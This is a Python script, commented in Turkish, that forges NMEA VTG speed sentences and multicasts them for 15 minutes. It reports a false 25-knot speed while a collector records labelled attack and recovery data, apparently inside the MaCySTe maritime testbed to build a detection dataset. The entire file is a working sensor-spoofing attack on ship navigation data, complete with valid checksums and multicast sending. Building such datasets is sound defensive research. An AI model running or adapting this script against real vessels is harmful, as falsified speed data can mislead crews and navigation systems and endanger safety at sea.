#!/usr/bin/env python3
"""
T0856 - Sensor Spoofing: Speed Spoofing (VTG Injection)
NMEA VTG sentence'a anormal hız inject et.
Normal speed: 0-6 knot
Saldırı: 25.0 knot inject — gerçekçi olmayan yüksek hız
MITRE: T0856 - Sensor Spoofing
"""
import socket, time, subprocess

DURATION = 900
RECOVERY = 120
NMEA_HOST = "239.0.1.1"
NMEA_PORT = 10110
OUTPUT = "/root/MaCySTe/grad_rl_data/attack_data.csv"
COLLECTOR = "/root/MaCySTe/macyste_collector.py"
FAKE_SPEED = 25.0  # knot — anormal


def nmea_checksum(sentence):
    cs = 0
    for c in sentence:
        cs ^= ord(c)
    return f"{cs:02X}"


def run_collector(label, duration):
    cmd = ["python3", COLLECTOR, "--label", label,
           "--duration", str(duration), "--output", OUTPUT, "--append"]
    print(f"[COLLECTOR] label={label} duration={duration}s")
    return subprocess.Popen(cmd)


print(f"[T0856-SPD] Speed Spoofing {FAKE_SPEED} knot basliyor...")
collector = run_collector("t0856_speed_spoof", DURATION)

end_time = time.time() + DURATION
count = 0

with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    while time.time() < end_time:
        # VTG: true track, magnetic track, speed knots, speed kmh
        speed_kmh = FAKE_SPEED * 1.852
        body = f"$GPVTG,10.0,T,,M,{FAKE_SPEED:.1f},N,{speed_kmh:.1f},K,A"
        cs = nmea_checksum(body[1:])
        pkt = (body + f"*{cs}\r\n").encode('ascii')
        sock.sendto(pkt, (NMEA_HOST, NMEA_PORT))
        count += 1
        time.sleep(1.0)
        if count % 60 == 0:
            print(f"[ATTACK] {count} paket, kalan={int(end_time-time.time())}s")

collector.wait()
print(f"[RECOVERY] {RECOVERY}s...")
run_collector("recovery", RECOVERY).wait()
print(f"[DONE] {count} VTG paket gonderildi")
